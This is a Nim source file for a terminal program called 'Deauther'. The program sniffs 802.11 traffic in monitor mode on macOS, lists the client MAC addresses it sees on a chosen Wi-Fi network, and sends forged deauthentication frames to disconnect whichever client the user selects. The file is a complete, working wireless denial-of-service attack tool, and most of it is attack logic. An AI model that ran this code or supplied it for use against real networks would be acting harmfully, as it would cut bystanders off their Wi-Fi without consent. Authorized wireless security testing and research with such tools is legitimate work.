import strutils, os, options, tables, times, strformat, asyncdispatch, logging
import algorithm, future

import pcap/[wrapper, async]
import corewlan
import nimbox

import radiotap, packet, tui, listboxlogger

type
  Stage = enum
    Menu, SelectSSID, PacketSniffing

  Deauther = ref object
    nb: NimBox
    current: Stage
    currentSSID: string
    crcFails: int
    macsBox, ssidBox: ListBox
    messagesOverlay: bool
    logger: ListBoxLogger
    deauthTarget: Option[string] ## MAC address we are targeting.

proc getPacket(pcap: AsyncPcap,
               deauther: Deauther): Future[Option[(Radiotap, Packet)]] {.async.} =
  let data = await pcap.readPacket()

  let radiotap = parseRadiotap(data)
  if radiotap.header.len.int >= data.len:
    return none((Radiotap, Packet))

  let packet = parsePacket(radiotap.data)
  if packet.calculatedFCS != packet.receivedFCS:
    deauther.crcFails.inc()
    return await getPacket(pcap, deauther)
  return some((radiotap, packet))

proc monitor(): AsyncPcap =
  # Set up PCAP.
  var err = newString(PCAP_ERRBUF_SIZE)
  var p = pcap_open_live(defaultIfName, 65536.cint, 1.cint, 1.cint, addr(err))

  if p.isNil():
    raise newException(OSError, "Could not open pcap")

  p.checkError p.pcap_set_datalink(DLT_IEEE802_11_RADIO)

  return p.newAsyncPcap()

proc writePacket(p: AsyncPcap, packet: Packet): Future[void] =
  var packetData = packet.serialize()
  var radiotapLen = 8'u16
  var radiotapData = newString(packetData.len + radiotapLen.int)
  copyMem(addr radiotapData[2], addr radiotapLen, 2)
  copyMem(addr radiotapData[radiotapLen.int],
          addr packetData[0], packetData.len)
  return p.writePacket(radiotapData)

proc gatherMacs(deauther: Deauther) {.async.} =
  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  info("Disassociating...")
  wif.disassociate()

  # Set up PCAP.
  var p = monitor()

  var accessPoints = initTable[string, CWNetwork]()
  # Figure out the MAC addresses and channels of the APs we should be looking at.
  let networks = wif.cachedScanResults()
  for network in items(CWNetwork, networks.allObjects()):
    let ssid = $network.ssid.toCString()

    if ssid == deauther.currentSSID and network.rssiValue > -70:
      let bssid = ($network.bssid.toCString()).toUpperAscii()
      accessPoints[bssid] = network

  # Set up storage for MAC addresses.
  var macs = initOrderedTable[
    string,
    tuple[tx, rx: int, ch: CWChannel, rssi: int]
  ]()
  while deauther.current == PacketSniffing:
    for bssid, network in accessPoints:
      # Switch to network's channel.
      info("Switching to ", network.wlanChannel.channelNumber)
      info("Looking for packets from/to ", bssid)
      wif.setWLANChannel(network.wlanChannel)

      info("Reading packets for 300ms...")
      let startTime = epochTime()
      while epochTime() - startTime < 0.3:
        let packetFut = getPacket(p, deauther)
        yield packetFut
        if packetFut.failed:
          error("Failed ", packetFut.error.msg)
        else:
          let (radiotap, packet) = packetFut.read.get()
          # How are address fields used?
          # http://80211notes.blogspot.co.uk/2013/09/understanding-address-fields-in-80211.html

          # Only care about packets transmitted to or from current network...
          # TODO: Compare BSSID in a better way, this toUpper/toLower conversion
          # is pretty error prone. Comparing numbers would be better.
          if bssid notin [
              $packet.header.address1, $packet.header.address2
            ]:
            debug("Skipping ", $packet.header.address1, "<-", $packet.header.address2)
            continue

          if $packet.header.address1 notin macs:
            macs[$packet.header.address1] = (0, 0, nil, 0)

          if $packet.header.address2 notin macs:
            macs[$packet.header.address2] = (0, 0, nil, 0)

          macs[$packet.header.address1].rx.inc()
          macs[$packet.header.address1].ch = network.wlanChannel
          macs[$packet.header.address1].rssi = radiotap.antennaSignal.int
          macs[$packet.header.address2].tx.inc()
          macs[$packet.header.address2].ch = network.wlanChannel
          macs[$packet.header.address2].rssi = radiotap.antennaSignal.int

      if deauther.deauthTarget.isSome:
        let target = deauther.deauthTarget.get()
        info("Deauthing ", target)
        let packet = initDeauthenticationPacket(target, bssid, bssid)
        await p.writePacket(packet)

    # Update UI
    macs.sort((x, y) => -cmp(x[1].tx + x[1].rx, y[1].tx + y[1].rx))
    deauther.macsBox.clear()
    for key, value in macs:
      if key in ["FF:FF:FF:FF:FF:FF", "0:0:0:0:0:0"]: continue

      let value = @[
        key, $value.tx, $value.rx, $value.ch.channelNumber, $value.rssi
      ]

      if key in accessPoints:
        deauther.macsBox.add(value, fg=clrBlue)
      elif deauther.deauthTarget.get("") == key:
        deauther.macsBox.add(value, fg=clrRed)
      else:
        deauther.macsBox.add(value)

    await sleepAsync(200)

proc selectSSID(deauther: Deauther) {.async.} =
  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  while deauther.current == SelectSSID:
    deauther.ssidBox.clear()

    # In case we ever want to probe manually. This explains how the OS does it
    # https://networkengineering.stackexchange.com/a/17225/46039

    let networks = wif.cachedScanResults()
    for network in items(CWNetwork, networks.allObjects()):
      deauther.ssidBox.add(@[
        $network.ssid.toCString(), $network.bssid.toCString(),
        $network.wlanChannel.channelNumber,
        $network.rssiValue
      ])

    deauther.ssidBox.sort((x, y) => cmp(x[3], y[3]))

    await sleepAsync(1000)

proc newDeauther(): Deauther =
  result = Deauther(
    nb: newNimbox(),
    current: Menu,
    currentSSID: "",
    macsBox: newListBox(
      50, 20,
      initListBoxData(@["MAC", "Tx", "Rx", "Ch", "📶"])
    ),
    ssidBox: newListBox(
      80, 20,
      initListBoxData(@["SSID", "BSSID", "Channel", "📶"])
    )
  )

  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  result.currentSSID = $toCString(wif.ssid())

proc draw(deauther: Deauther) =
  deauther.nb.clear()

  # Draw title header
  deauther.nb.drawTitle("Deauther")

  var controls = @[
    ("BkSpc", "Main Menu"),
    ("Q", "Quit"),
  ]
  var stats = @[
    ("SSID", deauther.currentSSID)
  ]

  case deauther.current
  of Menu:
    controls =
      @({ "1": "SSID", "2": "Scan"}) & controls
  of SelectSSID:

    deauther.nb.draw(deauther.ssidBox, 3)
  of PacketSniffing:
    let target = deauther.deauthTarget
    stats &= @({
      "CRC check fails": $deauther.crcFails,
      "Status":
        if target.isSome(): "Deauthing " & target.get() else: "Scanning",
    })

    if target.isSome():
      controls =
        @({
          "Enter": "Change target",
          "Space": "Stop deauthing"
        }) & controls
    else:
      controls =
        @({ "Enter": "Deauth"}) & controls

    # Draw list box.
    deauther.nb.draw(deauther.macsBox, 3)

  deauther.nb.drawStats(stats)

  deauther.nb.drawControls(controls)

  if deauther.messagesOverlay:
    deauther.nb.draw(deauther.logger.lb, 3)

  deauther.nb.present()

proc onEnter(deauther: Deauther) =
  case deauther.current
  of PacketSniffing:
    let row = deauther.macsBox.getSelectedRow()
    deauther.deauthTarget = some(row[0])
  else:
    discard

proc onSpace(deauther: Deauther) =
  case deauther.current
  of PacketSniffing:
    deauther.deauthTarget = none(string)
  else:
    discard

when isMainModule:
  let deauther = newDeauther()
  defer: deauther.nb.shutdown()

  # Set up UI elements.
  deauther.logger = newListBoxLogger()
  deauther.logger.levelThreshold = lvlInfo
  addHandler(deauther.logger)

  info("Started deauther")

  let listBoxes = [deauther.logger.lb, deauther.macsBox, deauther.ssidBox]
  # Run event loop.
  var evt: Event
  while true:
    deauther.draw()

    if hasPendingOperations():
      poll()

    evt = deauther.nb.peekEvent(100)
    case evt.kind:
      of EventType.Key:
        case evt.sym
        of Symbol.Escape:
          break
        of Symbol.Backspace:
          deauther.current = Menu
        of Symbol.Enter:
          deauther.onEnter()
        of Symbol.Space:
          deauther.onSpace()
        of Symbol.Character:
          case evt.ch
          of 'q': break
          of 'm':
            deauther.messagesOverlay = not deauther.messagesOverlay
          of '1':
            if deauther.current == Menu:
              deauther.current = SelectSSID
              asyncCheck selectSSID(deauther)
          of '2':
            if deauther.current == Menu:
              deauther.current = PacketSniffing
              asyncCheck gatherMacs(deauther)
          else:
            info("Key pressed: ", evt.ch)
        of Symbol.Down:
          for lb in listBoxes:
            lb.onDown()
        of Symbol.Up:
          for lb in listBoxes:
            lb.onUp()
        else: discard
      else: discard